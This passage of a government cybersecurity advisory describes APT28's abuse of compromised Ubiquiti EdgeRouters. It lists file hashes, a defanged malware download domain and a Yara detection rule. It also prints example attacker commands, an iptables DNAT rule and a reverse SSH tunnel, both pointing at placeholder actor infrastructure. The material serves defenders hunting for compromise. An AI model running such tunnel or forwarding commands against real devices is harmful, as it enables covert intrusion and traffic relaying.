See the MITRE\n**ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE**\nATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE\n[ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping)\n[and CISA’s Decider Tool.](https://github.com/cisagov/Decider/)\n\n### Overview\n\nThis advisory provides observed tactics, techniques, and procedures (TTPs), indicators of\ncompromise (IOCs), and recommendations to mitigate the threat posed by APT28 threat actors\nrelated to compromised EdgeRouters. Given the global popularity of EdgeRouters, the FBI and its\ninternational partners urge EdgeRouter network defenders and users to apply immediately the\nrecommendations in the Mitigations section of this CSA to reduce the likelihood and impact of\ncybersecurity incidents associated with APT28 activity.\n\nUbiquiti EdgeRouters have a user-friendly, Linux-based operating system that makes them popular\nfor both consumers and malicious cyber actors. EdgeRouters are often shipped with default\ncredentials and limited to no firewall protections to accommodate wireless internet service providers\n(WISPs). Additionally, EdgeRouters do not automatically update firmware unless a consumer\nconfigures them to do so.\n\n### Threat Actor Activity \n\nAs early as 2022, APT28 actors had utilized compromised EdgeRouters to facilitate covert cyber\noperations against governments, militaries, and organizations around the world. These operations\nhave targeted various industries, including Aerospace & Defense, Education, Energy & Utilities,\nGovernments, Hospitality, Manufacturing, Oil & Gas, Retail, Technology, and Transportation.\nTargeted countries include Czech Republic, Italy, Lithuania, Jordan, Montenegro, Poland, Slovakia,\nTurkey, Ukraine, United Arab Emirates, and the US[1][2]. Additionally, the actors have strategically\ntargeted many individuals in Ukraine.\n\nAn FBI investigation revealed APT28 actors accessed EdgeRouters compromised by Moobot, a\n[botnet that installs OpenSSH trojans on compromised hardware [T1588]. While the compromise of](https://attack.mitre.org/techniques/T1588/)\nEdgeRouters has been documented in open-source reporting, FBI investigation revealed each\ncompromised router accessed by APT28 actors housed a collection of Bash scripts and ELF binaries\n[designed to exploit backdoor OpenSSH daemons and related services [T1546] for a variety of](https://attack.mitre.org/versions/v14/techniques/T1557/)\npurposes.\n\nAPT28 actors have used compromised EdgeRouters to collect credentials, proxy network traffic, and\nhost spoofed landing pages and custom post-exploitation tools. For example, in early 2023, APT28\nactors authored custom Python scripts to collect account credentials for specifically targeted webmail\n[users. APT28 actors uploaded these custom Python scripts [T1587] to a subset of compromised](https://attack.mitre.org/versions/v14/techniques/T1587/)\nUbiquiti routers to validate stolen webmail account credentials collected via cross-site scripting and\n[browser-in-the-browser spear-phishing campaigns [T1566].](https://attack.mitre.org/versions/v14/techniques/T1566/)\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\nAdditionally, an FBI investigation revealed that as early as 2022, APT28 actors had exploited CVE2023-23397, a zero-day vulnerability at the time, to collect NTLMv2 digests from targeted Outlook\n[accounts [T1203]. Per a Microsoft blog post[3] published in March 2023, CVE-2023-23397 is a critical](https://attack.mitre.org/versions/v14/techniques/T1203/)\nelevation of privilege vulnerability in Microsoft Outlook on Windows wherein Net-NTLMv2 hashes are\n[leaked to actor-controlled infrastructure [T1119, T1020]. Despite Microsoft releasing a patch for the](https://attack.mitre.org/versions/v14/techniques/T1119/)\nvulnerability, FBI investigation revealed APT28 actors have continued to exploit CVE-2023-23397 to\nleak NTLM digests to actor controlled infrastructure. APT28 actors have installed publicly available\ntools such as Impacket ntlmrelayx.py[4] and Responder[5] on compromised Ubiquiti routers to\n[execute NTLM relay attacks [T1557] and host NTLMv2 rogue authentication servers [T1556].](https://attack.mitre.org/versions/v14/techniques/T1557/)\n\nIn summary, with root access to compromised Ubiquiti EdgeRouters, APT28 actors have unfettered\naccess to Linux-based operating systems to install tooling and to obfuscate their identity while\nconducting malicious campaigns.\n\n### Indicators of Compromise\n\nThe FBI identified IOCs for the Moobot OpenSSH trojan and for APT28 activity on EdgeRouters.\nReaders of this CSA can reference the observations below to determine if their EdgeRouters have\nbeen impacted by either party.\n\n### Moobot OpenSSH Trojan\n\nAPT28 actors have leveraged default credentials and trojanized OpenSSH server processes to\naccess EdgeRouters. Trojanized OpenSSH server processes are associated with Moobot, a Miraibased botnet that infects internet of things (IoT) devices using remotely exploitable vulnerabilities,\nsuch as weak or default passwords. Trojanized OpenSSH server binaries downloaded from\npackinstall[.]kozow[.]com replaced legitimate binaries on EdgeRouters accessed by APT28, allowing\nremote attackers to bypass authentication.\n\n### Credential Access via Python Scripts \n\nAPT28 actors have hosted custom Python scripts on compromised EdgeRouters to collect and\nvalidate stolen webmail account credentials. The scripts are typically stored alongside related log files\nin the home directory of a compromised user, e.g., /home/<compromised user>/srv/core.py and\n/home/<compromised user>/srv/debug.txt. The FBI has recovered verbose log files with information\nabout APT28 activity on EdgeRouters.\n```\n    File name SHA-256\n    core.py 4E32B04930D1F745EBA92255EE1C5E5AC82B939FF12DE0522C8A4905431D033D\n    core.py C51C6AA0230A2FEA888EBCD213D302F1CC9F6051FDB268AE5C7A09415845C404\n\n```\nNetwork defenders can use the FBI-created Yara rule below to locate credential collection scripts on\ncompromised EdgeRouters. Additionally, they can query network traffic for connections with API\nendpoint api[.]anti-captcha[.]com, which APT28 actors use in their custom Python scripts to\nautomatically break captcha problems on webmail login pages.\n```\n   rule APT28_core_scripts {\n   strings:\n       $a = \"make_response('BAD')\"\n       $b = \"make_response('Finaly')\"\n\n```\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n```\n       $c = \"make_response('NOOP')\"\n       $d = \"api.anti-captcha.com\"\n       $e = \"messages/remove\"\n       $f = \"acbb64c3de5ea5e5936df4a1eecf1235\"\n   condition:\n       5 of them\n   }\n\n### Exploitation of CVE-2023-23397\n\n```\nAPT28 actors have used ntlmrelayx.py and Responder to facilitate NTMLv2 credential leaks via\nexploitation of CVE-2023-23397 as a zero-day vulnerability since early 2022. The FBI collected\nevidence of APT28 CVE-2023-23397 activity on numerous compromised EdgeRouters. With default\nconfigurations, Responder logs activity to the following files:\n\n          - Responder-Session.log, and\n\n          - Responder.db.\n\nNetwork defenders and users can search EdgeRouters for tooling associated with ntlmrelayx.py\nand Responder to identify APT28 activity.\n\n### Proxy and Tunnel Infrastructure\n\nAPT28 actors have used iptables rules on EdgeRouters to establish reverse proxy connections to\ndedicated infrastructure. Readers of this CSA can review iptables chains and Bash histories on\nEdgeRouters for unusual invocations like the example provided below.\n```\n   iptables -t nat -I PREROUTING -d <router IP address> -p tcp -m tcp --dport 4443    j DNAT -to-destination <APT28 dedicated infrastructure>:10081\n\n```\nAdditionally, APT28 actors have uploaded adversary-controlled SSH RSA keys to compromised\nEdgeRouters to establish reverse SSH tunnels and access compromised devices. Readers of this\nCSA can review /root/.ssh/ and other .ssh/ directories under /home/ for unknown RSA keys, which\nadversaries have used to access EdgeRouters despite password changes. Readers can also query\nnetwork traffic logs on EdgeRouters to identify abnormal SSH sessions. An invocation of a reverse\nSSH tunnel used by APT28 actors is included below.\n```\n   ssh –i <RSA key> -p <port> root@<router IP address> -R <router IP address>:<port>\n\n#### MASEPIE Malware\n\n```\nIn December 2023, APT28 actors wrote MASEPIE[6], a small Python backdoor capable of executing\narbitrary commands on victim machines. An FBI investigation revealed that on more than one\noccasion, APT28 used compromised Ubiquiti EdgeRouters as command-and-control infrastructure for\nMASEPIE backdoors deployed against targets. Data sent to and from the EdgeRouters was\nencrypted using a randomly generated 16-character AES key. It is important to note that APT28 does\nnot deploy MASEPIE on EdgeRouters, but rather on systems belonging to targeted individuals and\norganizations.\n\n\n**TLP:CLEAR**\n\n\n-----\n\n**TLP:CLEAR**\n\n##### SHA-256 for MASEPIE backdoors\n\n40a7fd89b9e51b0a515ac2355036d203357be90a2200b9c506b95c12db54c7aa\n\n18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6\n\n0429bdc6a302b4288aea1b1e2f2a7545731c50d647672fa65b012b2a2caa386e\n\n## DETECTION\n\nTo locate related, malicious files on EdgeRouters, search Bash histories of all users for file downloads\nfrom domain packinstall[.]kozow[.]com, query network traffic for connections with domain\n```\n   packinstall[.]kozow[.]com, and reference the file hash table below to locate artifacts on disk.\n\n```\nAdditionally, if directory /usr/lib/libu.a/ exists on an EdgeRouter, it is likely an infection occurred.\n```\n    File path SHA-256\n    /usr/sbin/cl 3B5ED45345193B06F40515DA342FF146267E8340B2E1AB6D55A257D2E3554A2B\n    /usr/sbin/cl ADAE1BD8938B9A0D825A2EF7E7C4E000F01966C397306027119F20D7ECCE955D\n    /usr/sbin/cts C09F8D0A9FA0F9BB3E19556182A95782DAEC2F2F532CAB5EEB5528F2CD783583\n    /usr/sbin/env 1CC20155517860557C94308EC913E4C3BFC072C34CE33449641CC9FB1D571B21\n    /usr/sbin/events 551EB82D82B7A8830549C9183EB39ACF19719C84B9BCCC7FB443504B093F6BB9\n    /usr/sbin/events CD83DD9470603B1A1951EEFA95B602E34207C4D5E62C649642E7160574A9C50D\n    /usr/sbin/events FBC2E6820C874ED102BAB304382EDEFFB9708E7B8445E126C227A6C289D92708\n    /usr/sbin/ptty C9E06C7C62395DA32C91CC0C4ACB95F29A0AA3380A833E7C7B24B8D4DB50C0C6\n    /usr/sbin/ptty 5FACBE53B4C63DBC865F3713385358DF490A4BAD9211337241D85F0554CCA40A\n    /usr/sbin/ptty C7C40CDCDD65E468EE29D330A34E8EE94C26AA8B3F1830E0A8DFEA8ACA3CDD50\n    /usr/sbin/sshd A4A95807F1C5B200D5D94E3E811A7C4AF2D0D9CA88CA4D7F9D02015574F4716F\n    /usr/sbin/sshd 104E3EA9A190BA039488F5200824FE883B98F6FE01D05A1B55E15ED2199C807A\n\n```\nSome versions of the OpenSSH trojan create malicious users systemd and systemx in /etc/shadow\nand /etc/passwd on infected EdgeRouters.
